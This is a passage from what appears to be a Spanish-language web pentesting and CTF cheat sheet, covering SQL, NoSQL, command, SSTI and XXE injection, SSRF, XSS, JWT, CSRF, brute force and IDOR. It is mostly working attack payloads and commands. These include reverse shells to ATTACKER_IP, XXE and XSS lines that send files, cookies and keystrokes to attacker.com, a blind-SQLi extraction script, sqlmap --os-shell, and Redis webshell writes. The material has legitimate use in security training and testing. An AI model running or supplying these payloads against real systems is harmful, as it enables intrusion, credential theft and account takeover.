' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
```

### 3.1.6 Blind SQLi (Boolean-Based)

```sql
-- Extracción carácter a carácter
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b'--
...

-- Automatización con Python
import requests
import string

url = "http://target/page?id=1"
charset = string.ascii_lowercase + string.digits + "_"
password = ""

for pos in range(1, 33):  # Asumir hash de 32 chars
    for char in charset:
        payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{char}'--"
        r = requests.get(url + payload)
        if "Welcome" in r.text:  # Condición de éxito
            password += char
            print(f"[{pos}] {password}")
            break
```

### 3.1.7 Blind SQLi (Time-Based)

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- PostgreSQL
' AND pg_sleep(5)--
' AND CASE WHEN (SELECT substring(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' IF (SELECT SUBSTRING(password,1,1) FROM users)='a' WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--
```

### 3.1.8 SQLMap: Automatización

```bash
# Detección y explotación básica
sqlmap -u "http://target/page?id=1" --batch

# Con cookie y headers
sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=abc123" --headers="X-Forwarded-For: 127.0.0.1" --batch

# Especificar DBMS
sqlmap -u "http://target/page?id=1" --dbms=mysql --batch

# Dump de tabla específica
sqlmap -u "http://target/page?id=1" -D database -T users --dump --batch

# Leer archivos del servidor
sqlmap -u "http://target/page?id=1" --file-read=/etc/passwd --batch

# Escribir shell
sqlmap -u "http://target/page?id=1" --os-shell --batch

# POST requests
sqlmap -u "http://target/login" --data="username=admin&password=test" -p username --batch

# Con tamper scripts (bypass WAF)
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch

# Nivel y riesgo máximo
sqlmap -u "http://target/page?id=1" --level=5 --risk=3 --batch

# Time-based con threads
sqlmap -u "http://target/page?id=1" --technique=T --threads=5 --batch
```

### 3.1.9 Bypass de WAF para SQLi

```sql
-- Comentarios inline
'/**/OR/**/1=1--
'/*!50000OR*/1=1--

-- Encoding
%27%20OR%201%3D1--
' OR 1=1--  (URL encoded)

-- Case variation
' Or 1=1--
' oR 1=1--

-- Alternativas a espacios
'+OR+1=1--
'%09OR%091=1--  (tab)
'%0aOR%0a1=1--  (newline)

-- Alternativas a OR
' || 1=1--
' OR 1 LIKE 1--

-- Alternativas a SELECT
' UNION ALL SELECT 1,2,3--
' UNION/**/SELECT 1,2,3--

-- Concatenación
' AND 'a'='a
' AND concat(0x41,0x42)='AB'

-- Char() function
' AND CHAR(65)='A'
```

---

<a name="32"></a>
## 3.2 NOSQL INJECTION

### 3.2.1 MongoDB Injection

**CWE:** CWE-943 | **CVSS:** hasta 8.1

```javascript
// Autenticación bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}

// Extracción de datos
{"username": "admin", "$where": "this.password.match(/^a/)"}
{"$where": "this.password.charAt(0)=='a'"}

// Operator injection en URL
username[$gt]=&password[$gt]=
username[$ne]=admin&password[$ne]=x
username[$regex]=^admin&password[$regex]=.*

// JavaScript injection (si $where está habilitado)
{"$where": "function(){return this.password.length > 5}"}
```

### 3.2.2 Redis Injection

```bash
# Comandos inyectados
SET key value\r\nGET key\r\n
CONFIG SET dir /var/www/html\r\nSET shell "<?php system($_GET['c']);?>"\r\nSAVE\r\n

# SSRF via Redis
dict://target:6379/INFO
gopher://target:6379/_INFO%0D%0A
```

### 3.2.3 CouchDB Injection

```
# Bypass de autenticación
{"username": {"$gt": null}, "password": {"$gt": null}}

# Server-side JS
{"_id": "1", "type": "user", "roles": [], "validate_doc_update": "function(){return true}"}
```

---

<a name="33"></a>
## 3.3 COMMAND INJECTION (OS INJECTION)

### 3.3.1 Fundamentos

**CWE:** CWE-78 | **CVSS:** hasta 9.8

Permite ejecutar comandos arbitrarios del sistema operativo a través de una aplicación vulnerable.

### 3.3.2 Separadores de Comandos

```bash
# Ejecución secuencial
; command
&& command
|| command
| command
`command`
$(command)
%0acommand  # newline
%0dcommand  # carriage return

# Ejemplos
http://target/ping?ip=127.0.0.1;id
http://target/ping?ip=127.0.0.1|whoami
http://target/ping?ip=127.0.0.1&&cat /etc/passwd
http://target/ping?ip=127.0.0.1`id`
http://target/ping?ip=$(cat /etc/shadow)
```

### 3.3.3 Payloads de Command Injection

```bash
# Lectura de archivos
;cat /etc/passwd
;cat /etc/shadow
;cat /flag.txt
;cat /app/flag.txt
;cat /home/*/flag*

# Reverse shells
;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
;nc ATTACKER_IP 4444 -e /bin/sh
;php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Enumeración
;id
;whoami
;uname -a
;ls -la /
;find / -name "flag*" 2>/dev/null
;env
;ps aux
;netstat -tlnp
;cat /etc/os-release

# Bypass de filtros
;cat /etc/pass${PATH:0:1}wd  # si '/' está filtrado
;c'a't /etc/passwd  # si 'cat' está filtrado
;/bin/cat /etc/passwd  # path completo
;c\at /etc/passwd  # backslash
;ca''t /etc/passwd  # quotes vacíos
```

### 3.3.4 Detección de Command Injection

```bash
# Payloads de detección (sin daño)
;sleep 5
|sleep 5
&&sleep 5
`sleep 5`
$(sleep 5)
;ping -c 5 127.0.0.1
|nslookup attacker.com

# Detección blind (time-based)
;sleep 10  # Si la respuesta tarda 10s más, es vulnerable
```

---

<a name="34"></a>
## 3.4 LDAP INJECTION

### 3.4.1 Payloads LDAP

**CWE:** CWE-90 | **CVSS:** hasta 7.5

```
# Bypass de autenticación
*)(&
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(&
*)(|(objectclass=*))
admin)(|(password=*

# Extracción de información
*)(uid=*))(|(uid=*
admin)(&(|(password=*
*))(|(objectclass=*))

# Blind LDAP
admin)(|(password=a*
admin)(|(password=b*
```

---

<a name="35"></a>
## 3.5 XPATH INJECTION

### 3.5.1 Payloads XPath

**CWE:** CWE-91 | **CVSS:** hasta 7.5

```xml
' or '1'='1
' or '1'='1'--
"] | //* | //["
' union select * from users--
1 or 1=1
' and contains(name,'admin')--
count(//user)
string-length(//user[1]/password)
substring(//user[1]/password,1,1)
```

---

<a name="36"></a>
## 3.6 SSTI (SERVER-SIDE TEMPLATE INJECTION)

### 3.6.1 Detección

**CWE:** CWE-94 | **CVSS:** hasta 9.8

```
# Payloads de detección universal
{{7*7}}        → 49 (Jinja2, Twig)
${7*7}         → 49 (Freemarker, Thymeleaf)
#{7*7}         → 49 (Thymeleaf)
<%= 7*7 %>     → 49 (ERB, EJS)
{{7*'7'}}      → 7777777 (Jinja2) / 49 (Twig)
${{7*7}}       → Spring EL
*{7*7}         → Thymeleaf
{{config}}     → Jinja2 (config leak)
{{self}}       → Twig
```

### 3.6.2 Explotación por Motor

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}

# RCE completo
{{config.items()[0][1].__class__.__mro__[2].__subclasses__()[40]('/tmp/shell.sh','w').write('bash -i >& /dev/tcp/ATTACKER/4444 0>&1')}}
```

**Twig (PHP):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag.txt")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

**Freemarker (Java):**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Velocity (Java):**
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
```

**Smarty (PHP):**
```php
{php}echo `id`;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**ERB (Ruby):**
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen("cat /flag.txt").read %>
```

### 3.6.3 Herramienta tplmap

```bash
# Detección y explotación automatizada
python3 tplmap.py -u "http://target/page?name=test"
python3 tplmap.py -u "http://target/page?name=test" --os-shell
python3 tplmap.py -u "http://target/page" -d "name=test" --os-cmd "cat /flag.txt"
```

---

<a name="37"></a>
## 3.7 XXE (XML EXTERNAL ENTITY)

### 3.7.1 Payloads XXE

**CWE:** CWE-611 | **CVSS:** hasta 9.8

```xml
<!-- Lectura de archivos locales -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF interno -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

<!-- Blind XXE (OOB) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%xxe;'>">
  %eval;
  %exfil;
]>
<foo>test</foo>

<!-- Blind XXE con DTD externo -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>test</foo>

<!-- evil.dtd (en servidor del atacante) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;

<!-- XXE en SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>

<!-- XXE en DOCX/XLSX (son XML comprimidos) -->
# Descomprimir el docx, editar [Content_Types].xml o word/document.xml
# Añadir la entidad XXE y recomprimir

<!-- XXE con PHP expect:// -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>

<!-- XXE con PHP php://filter -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>
```

### 3.7.2 Detección de XXE

```bash
# Enviar XML con entidad externa a endpoints que aceptan XML
# Endpoints comunes: /api/upload, /soap, /wsdl, /xmlrpc
# Content-Type: application/xml o text/xml

# Payload de detección
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "XXE_TEST">]>
<root>&xxe;</root>
# Si responde "XXE_TEST", el parser procesa entidades
```

---

<a name="38"></a>
## 3.8 SSRF (SERVER-SIDE REQUEST FORGERY)

### 3.8.1 Payloads SSRF

**CWE:** CWE-918 | **CVSS:** hasta 9.8

```bash
# Acceso a servicios internos
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://0177.0.0.1/admin  # Octal
http://2130706433/admin  # Decimal
http://0x7f000001/admin  # Hex

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Cloud metadata (GCP)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Acceso a servicios internos por puerto
http://localhost:6379/  # Redis
http://localhost:9200/  # Elasticsearch
http://localhost:5432/  # PostgreSQL
http://localhost:3306/  # MySQL
http://localhost:8080/  # Tomcat/Spring

# Protocolos alternativos
file:///etc/passwd
dict://localhost:6379/INFO
gopher://localhost:6379/_INFO
ftp://localhost:21/
ldap://localhost:389/

# DNS rebinding
http://127.0.0.1.nip.io/
http://localtest.me/
http://customer1.app.localhost/

# Bypass de filtros
http://127.1/
http://0/
http://0.0.0.0/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://①②⑦.⓪.⓪.①/  # Unicode
```

---

<a name="parte-iv"></a>
# PARTE IV: CROSS-SITE SCRIPTING (XSS)

---

<a name="41"></a>
## 4.1 REFLECTED XSS

### 4.1.1 Payloads Básicos

**CWE:** CWE-79 | **CVSS:** hasta 9.3

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

### 4.1.2 Vectores de XSS sin `<script>`

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onpageshow=alert(1)>
<frameset onload=alert(1)>
<table background="javascript:alert(1)">
<div style="width:expression(alert(1))">  <!-- IE only -->
<style>@import "javascript:alert(1)";</style>
<link rel="import" href="data:text/html,<script>alert(1)</script>">
```

---

<a name="42"></a>
## 4.2 STORED XSS (PERSISTENT)

### 4.2.1 Vectores de Almacenamiento

```html
<!-- En comentarios de blog -->
<script>document.location="http://attacker.com/steal?c="+document.cookie</script>

<!-- En perfil de usuario -->
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">

<!-- En mensajes de foro -->
<svg onload="new Image().src='http://attacker.com/?c='+btoa(document.cookie)">

<!-- En campos de nombre/username -->
"><script>fetch('http://attacker.com/'+document.cookie)</script>

<!-- En uploads de archivos (SVG) -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>

<!-- En Markdown (si no se sanitiza) -->
[Click me](javascript:alert(1))
![img](javascript:alert(1))
```

### 4.2.2 Keylogger con XSS

```javascript
<script>
document.addEventListener('keypress', function(e) {
    new Image().src = 'http://attacker.com/log?key=' + e.key;
});
</script>
```

---

<a name="43"></a>
## 4.3 DOM-BASED XSS

### 4.3.1 Fuentes y Sinks Peligrosos

```javascript
// FUENTES (donde entra el input del usuario)
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
document.cookie
document.referrer
window.location
window.location.hash
window.location.search
window.name
location.href
location.pathname
history.pushState
localStorage.getItem()

// SINKS (donde se ejecuta como código)
innerHTML / outerHTML
document.write() / document.writeln()
eval()
setTimeout() / setInterval() con strings
Function() constructor
document.location.assign() / replace()
window.open()
element.setAttribute("src", ...)
element.href
jQuery: .html(), .append(), .prepend()
```

### 4.3.2 Ejemplos de DOM XSS

```html
<!-- Vulnerable: usa location.hash directamente -->
<script>
  var content = decodeURIComponent(location.hash.substring(1));
  document.getElementById("output").innerHTML = content;
</script>
<!-- Exploit: http://target/page#<img src=x onerror=alert(1)> -->

<!-- Vulnerable: usa document.referrer -->
<script>
  document.write('<a href="' + document.referrer + '">Back</a>');
</script>

<!-- Vulnerable: usa postMessage sin validación -->
<script>
  window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
  });
</script>
```

---

<a name="44"></a>
## 4.4 BLIND XSS

### 4.4.1 Payloads para Blind XSS

```html
<!-- Se ejecuta en un contexto que no vemos (admin panel, logs) -->
<script src="http://attacker.com/xss.js"></script>
<img src=x onerror="fetch('http://attacker.com/blind?c='+document.cookie)">
"><script src=http://attacker.com/xss.js></script>

<!-- Payload con callback -->
<script>
  fetch('http://attacker.com/blind', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: document.URL,
      html: document.documentElement.innerHTML
    })
  });
</script>

<!-- Herramientas para Blind XSS -->
<!-- XSS Hunter: xsshunter.com -->
<!-- BeEF Framework: beefproject.com -->
<!-- PwnXSS, XSStrike -->
```

---

<a name="45"></a>
## 4.5 BYPASS DE FILTROS WAF

### 4.5.1 Técnicas de Evasión

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

<!-- Sin espacios -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
"><svg/onload=alert(1)>

<!-- Null bytes y caracteres especiales -->
<script>alert(1)</script%00>
<img src=x onerror=alert(1)//>

<!-- Doble encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Eventos alternativos -->
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>

<!-- JavaScript URI -->
<a href="javascript:alert(1)">click</a>
<a href="javascript:void(0)" onclick="alert(1)">click</a>
<a href="jAvAsCrIpT:alert(1)">click</a>
<a href="java%0d%0ascript:alert(1)">click</a>

<!-- Data URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- SVG con animate -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x to=1>

<!-- Template literals (bypass de paréntesis) -->
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>

<!-- Bypass de comillas -->
<script>alert(String.fromCharCode(49))</script>
<script>alert`1`</script>
<img src=x onerror=alert&lpar;1&rpar;>
```

### 4.5.2 Herramientas de XSS

```bash
# XSStrike (detección y fuzzing)
python3 xsstrike.py -u "http://target/page?q=test"

# Dalfox (scanner XSS)
dalfox url "http://target/page?q=test"
dalfox file urls.txt --output results.txt

# BeEF (explotación post-XSS)
# beefproject.com - hook de navegadores

# XSSer
xsser --url "http://target/page?q=XSS" --auto
```

---

<a name="46"></a>
## 4.6 XSS EN CONTEXTOS ESPECÍFICOS

### 4.6.1 XSS en Atributos HTML

```html
<!-- Dentro de un atributo con comillas dobles -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)

<!-- Dentro de un atributo con comillas simples -->
' onmouseover='alert(1)
' onfocus='alert(1)' autofocus='

<!-- Dentro de un atributo sin comillas -->
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
```

### 4.6.2 XSS en JavaScript

```javascript
// Dentro de un string JS
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>

// Dentro de una función
');alert(1);//
"};alert(1);//

// Template injection en JS
${alert(1)}
```

### 4.6.3 XSS en URLs

```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

---

<a name="parte-v"></a>
# PARTE V: AUTENTICACIÓN Y SESIONES

---

<a name="51"></a>
## 5.1 BROKEN AUTHENTICATION

### 5.1.1 Credential Stuffing y Fuerza Bruta

**CWE:** CWE-287 | **CVSS:** hasta 9.8

```bash
# Hydra (fuerza bruta multi-protocolo)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -t 16
hydra -L users.txt -P passwords.txt ssh://target -t 4
hydra -l admin -P passwords.txt ftp://target
hydra -l admin -P passwords.txt target -s 3306 mysql

# Medusa
medusa -h target -u admin -P passwords.txt -M http -m DIR:/login -m METHOD:POST

# Burp Suite Intruder
# Configurar: Positions → username y password
# Wordlist: rockyou.txt o lista personalizada
# Grep: "incorrect", "invalid", "error"

# Patator
patator http_fuzz url=http://target/login method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='incorrect'

# Default credentials (SIEMPRE probar primero)
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
user:user
guest:guest
administrator:administrator
```

### 5.1.2 Password Spraying

```bash
# Una contraseña común contra muchos usuarios
hydra -L users.txt -p 'Password123!' target http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -t 4

# Contraseñas comunes para spraying
Password1, Password123, Welcome1, Qwerty123, Letmein1
Company2024, Summer2024, Winter2024
changeme, admin123, passw0rd
```

### 5.1.3 Autenticación por Defecto

```bash
# Servicios con credenciales por defecto
# Router: admin/admin, admin/password
# MySQL: root/(vacío), root/root
# PostgreSQL: postgres/postgres
# Redis: sin contraseña por defecto
# Elasticsearch: sin autenticación por defecto
# Tomcat: tomcat/tomcat, admin/admin
# Jenkins: admin/admin
# WordPress: admin/password
# phpMyAdmin: root/(vacío)
# MongoDB: sin autenticación por defecto
```

---

<a name="52"></a>
## 5.2 JWT VULNERABILITIES

### 5.2.1 Estructura de JWT

```
Header.Payload.Signature

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "1234567890", "name": "admin", "role": "admin", "iat": 1516239022}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

### 5.2.2 Ataques a JWT

```bash
# Decodificar (jwt.io o manualmente)
echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.xxx" | cut -d. -f2 | base64 -d

# Ataque 1: Algorithm None
# Cambiar header a {"alg": "none", "typ": "JWT"}
# Eliminar la firma
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.

# Ataque 2: Algorithm Confusion (RS256 → HS256)
# Si el servidor usa RSA, cambiar a HMAC con la clave pública como secreto
# Header: {"alg": "HS256"}
# Firmar con la clave pública del servidor

# Ataque 3: Weak Secret (brute force)
hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt
john --format=HMAC-SHA256 jwt_token.txt --wordlist=rockyou.txt

# Ataque 4: KID Injection
# Si el header tiene "kid", puede ser vulnerable a SQLi o path traversal
{"alg":"HS256","typ":"JWT","kid":"1' UNION SELECT 'secret'--"}

# Ataque 5: Modificar payload
# Decodificar, cambiar "role":"user" a "role":"admin", re-firmar

# Herramienta jwt_tool
python3 jwt_tool.py TOKEN_HERE -X a  # Test all attacks
python3 jwt_tool.py TOKEN_HERE -C -d /usr/share/wordlists/rockyou.txt  # Crack
python3 jwt_tool.py TOKEN_HERE -I -pc role -pv admin  # Modify claim
python3 jwt_tool.py TOKEN_HERE -T  # Tamper without signing
```

### 5.2.3 JWT en CTF: Patrones Comunes

```python
import jwt
import base64
import json

# Decodificar sin verificar
token = "eyJ..."
header = json.loads(base64.b64decode(token.split('.')[0] + '=='))
payload = json.loads(base64.b64decode(token.split('.')[1] + '=='))
print(header, payload)

# Crear token con alg: none
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
forged_token = h.decode() + '.' + p.decode() + '.'
print(forged_token)

# Crackear secreto con jwt_tool o hashcat
# Si el secreto es débil, se puede firmar cualquier payload
```

---

<a name="53"></a>
## 5.3 SESSION MANAGEMENT

### 5.3.1 Session Fixation

**CWE:** CWE-384

```bash
# El atacante establece el session ID antes de que la víctima se autentique
# 1. Atacante obtiene un session ID válido
# 2. Atacante fuerza ese session ID en la víctima (cookie, URL parameter)
# 3. Víctima se autentica con ese session ID
# 4. Atacante usa el mismo session ID para acceder a la sesión autenticada

# Detección:
# ¿El session ID cambia después del login?
# ¿El session ID está en la URL?
# ¿La cookie tiene flag Secure y HttpOnly?
```

### 5.3.2 Session Hijacking

```bash
# Robo de cookies via XSS
<script>document.location="http://attacker.com/steal?c="+document.cookie</script>

# Robo via sniffing (si no hay HTTPS)
# Wireshark: filter "http.cookie"

# Predicción de session IDs
# Si el session ID es incremental o basado en timestamp:
# Session ID = timestamp + random_seed
```

---

<a name="54"></a>
## 5.4 OAUTH Y SSO

### 5.4.1 Vulnerabilidades OAuth

```bash
# Open Redirect en redirect_uri
https://auth.provider.com/authorize?client_id=xxx&redirect_uri=https://attacker.com&response_type=code

# Robo de authorization code
# Si redirect_uri no se valida estrictamente

# State parameter missing (CSRF en OAuth)
# Sin state: un atacante puede vincular su cuenta OAuth a la sesión de la víctima

# Token leakage en referrer
# Si el access token está en la URL, puede filtrarse via Referer header

# SSRF en token endpoint
# Si el servidor OAuth hace fetch a un redirect_uri controlado
```

---

<a name="55"></a>
## 5.5 CSRF (CROSS-SITE REQUEST FORGERY)

### 5.5.1 Payloads CSRF

**CWE:** CWE-352 | **CVSS:** hasta 8.8

```html
<!-- Formulario POST automático -->
<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>

<!-- GET request via imagen -->
<img src="http://target.com/api/delete?id=1&token=stolen_token">

<!-- JSON POST con XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/api/change-email", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send(JSON.stringify({"email": "attacker@evil.com"}));
</script>

<!-- Con token CSRF (si se puede obtener via XSS) -->
<script>
fetch('/api/get-csrf-token')
  .then(r => r.json())
  .then(data => {
    fetch('/api/transfer', {
      method: 'POST',
      headers: {'X-CSRF-Token': data.token, 'Content-Type': 'application/json'},
      body: JSON.stringify({amount: 1000, to: 'attacker'})
    });
  });
</script>
```

---

<a name="56"></a>
## 5.6 MFA BYPASS

### 5.6.1 Técnicas de Bypass de 2FA/MFA

```bash
# Bypass de código OTP
# 1. Brute force del código (si es de 4-6 dígitos sin rate limit)
# 2. Reutilización de código OTP ya usado
# 3. No verificar el código en el servidor (solo en el cliente)
# 4. Cambiar la respuesta del servidor (200 → success)

# Bypass de TOTP
# Si el servidor no valida el timestamp correctamente
# Ventana de tiempo amplia (±5 minutos)

# Bypass de SMS
# SIM swapping
# SS7 attacks (avanzado)
# Interceptar el SMS via malware

# Bypass de push notification
# Fatiga de push (enviar muchas notificaciones hasta que el usuario acepta)
# Race condition entre verificación y sesión

# En CTF: buscar la lógica de verificación
# A veces el 2FA se puede saltar:
# - Eliminando el parámetro de verificación
# - Cambiando el paso en el flujo (ir directo a /dashboard)
# - Modificando la cookie de sesión
# - Brute force del código (burp intruder)
```

---

<a name="parte-vi"></a>
# PARTE VI: CONTROL DE ACCESO

---

<a name="61"></a>
## 6.1 IDOR (INSECURE DIRECT OBJECT REFERENCE)

### 6.1.1 Patrones de IDOR

**CWE:** CWE-639 | **CVSS:** hasta 9.8

```bash
# Manipulación de IDs en URLs
GET /api/users/1234/profile → GET /api/users/1235/profile
GET /api/orders/5678 → GET /api/orders/5679
GET /download?file=report_user1.pdf → file=report_user2.pdf
DELETE /api/orders/5678 → DELETE /api/orders/5679

# Manipulación de IDs en parámetros POST
POST /api/update-profile {"user_id": 1234} → {"user_id": 1235}
POST /api/transfer {"from_account": "A123"} → {"from_account": "A456"}

# Manipulación de IDs en headers
X-User-ID: 1234 → X-User-ID: 1235

# IDOR con encoding
/api/users/1234 → /api/users/%31%32%33%35 (URL encoded)
/api/users/1234 → /api/users/0x4D3 (hex)

# IDOR en GraphQL
query { user(id: "1234") { email password } }
# Cambiar el ID a otro usuario

# IDOR con parámetros adicionales
GET /api/files?user_id=1234&file=secret.pdf
# Cambiar user_id a otro usuario

# IDOR en APIs REST
GET /api/v1/users/me → GET /api/v1/users/other_user
PUT /api/v1/users/me/role → PUT /api/v1/users/other_user/role
```

### 6.1.2 Detección de IDOR

```bash
# 1. Crear dos cuentas (A y B)
# 2. Autenticarse como A
# 3. Capturar todas las requests
# 4. Reemplazar el ID de A con el ID de B
# 5. Verificar si se accede a datos de B

# Automatización con Burp Suite:
# Autorize extension: configurar cookie de usuario B
# Navegar como usuario A → Autorize verifica si B puede acceder
```

---

<a name="62"></a>
## 6.2 PATH TRAVERSAL / LFI / RFI

### 6.2.1 Path Traversal

**CWE:** CWE-22 | **CVSS:** hasta 9.1

```bash
# Payloads básicos
../../../etc/passwd
../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
%252e%252e%252f%252e%252e%252f
..%252f..%252f..%252fetc%252fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
